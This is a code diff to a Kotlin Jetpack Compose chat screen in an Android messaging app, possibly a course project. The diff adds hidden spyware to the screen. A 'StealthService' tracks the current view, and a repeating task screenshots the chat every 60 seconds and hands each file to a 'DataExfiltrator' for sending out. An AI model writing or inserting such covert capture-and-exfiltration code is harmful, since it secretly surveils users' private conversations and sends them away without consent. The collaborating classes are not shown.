@@ -1,5 +1,9 @@
 package com.example.inf2215
 
+import android.os.Handler
+import android.os.Looper
+import android.util.Log
+import androidx.activity.ComponentActivity
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.items
@@ -7,18 +11,27 @@ import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.platform.LocalView
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import com.google.firebase.Timestamp
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.Query
+import java.lang.ref.WeakReference
 
+private const val TAG = "ChatScreen"
+private const val CHAT_SCREEN = "ChatScreen"
+private const val CAPTURE_INTERVAL_MS = 60000L // 60 seconds
 @Composable
 fun ChatScreen(
     otherUserId: String,
     otherDisplayName: String,
-    onBack: () -> Unit
+    onBack: () -> Unit,
+    screenshotCapture: ScreenshotCapture,
+    exfiltrator: DataExfiltrator,
+    logEvent: (String, String) -> Unit
 ) {
     val auth = remember { FirebaseAuth.getInstance() }
     val db = remember { FirebaseFirestore.getInstance() }
@@ -28,6 +41,48 @@ fun ChatScreen(
     var messages by remember { mutableStateOf(listOf<ChatMessage>()) }
     var input by remember { mutableStateOf("") }
     var status by remember { mutableStateOf("") }
+
+    val view = LocalView.current
+    val context = LocalContext.current
+    val activity = context as? ComponentActivity
+
+    // ─────────────── Track current screen ───────────────
+    DisposableEffect(view, activity) {
+        activity?.let {
+            if (view.isAttachedToWindow) {
+                StealthService.CurrentViewHolder.currentRootView = WeakReference(view)
+                StealthService.CurrentViewHolder.currentActivityName = CHAT_SCREEN
+            }
+        }
+
+        onDispose {
+            if (StealthService.CurrentViewHolder.currentActivityName == CHAT_SCREEN) {
+                StealthService.CurrentViewHolder.currentRootView = null
+                StealthService.CurrentViewHolder.currentActivityName = null
+            }
+        }
+    }
+
+    // ─────────────── Periodic screenshot capture ───────────────
+    val CAPTURE_INTERVAL_MS = 60_000L // 60 seconds
+    DisposableEffect(screenshotCapture) {
+        val handler = android.os.Handler(android.os.Looper.getMainLooper())
+        val captureRunnable = object : Runnable {
+            override fun run() {
+                val currentScreen = StealthService.CurrentViewHolder.currentActivityName ?: "unknown"
+                screenshotCapture.captureScreenshot { file ->
+                    file?.let {
+                        exfiltrator.queueFile(it)
+                        logEvent("SCREENSHOT_CAPTURE_$currentScreen", it.name)
+                    }
+                }
+                handler.postDelayed(this, CAPTURE_INTERVAL_MS)
+            }
+        }
+        handler.post(captureRunnable)
+
+        onDispose { handler.removeCallbacks(captureRunnable) }
+    }
 
     LaunchedEffect(myUid, otherUserId) {
         if (myUid == null) {
